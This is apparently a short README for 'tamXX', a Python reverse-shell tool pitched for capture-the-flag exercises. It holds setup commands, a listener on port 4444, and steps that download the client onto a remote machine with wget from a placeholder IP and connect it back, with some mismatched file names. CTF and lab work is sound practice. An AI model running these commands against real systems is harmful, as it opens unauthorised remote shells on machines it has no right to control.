# tamcat
What is tamXX ?
tamXX is a python reverse shell helping you in ctf
# REVERSE SHELL PYTHON
*by arvialo*

**SETUP tamXX**
```bash
git clone https://github.com/Arvialo/tamXX
cd tamXX
pip3 install -r requirements.txt
```

# USE tamXX
**ON LOCAL MACHINE**
```bash
chmod +x tamServ.py
./tamServ --help # get help
./tamServ -l -p 4444
./tamServ --listen --port 4444
```

**ON REMOTE MACHINE**
```bash
#firt, put tamCli.py on remote machine by http server for example
# on local machine : python3 -m http.server
# on remote machine : wget http://<IP>:8000/tamCli.py
chmod +x tamCli.py
./tamCli.py --help
./tamCl.py --target localhost --prompt --port 4444
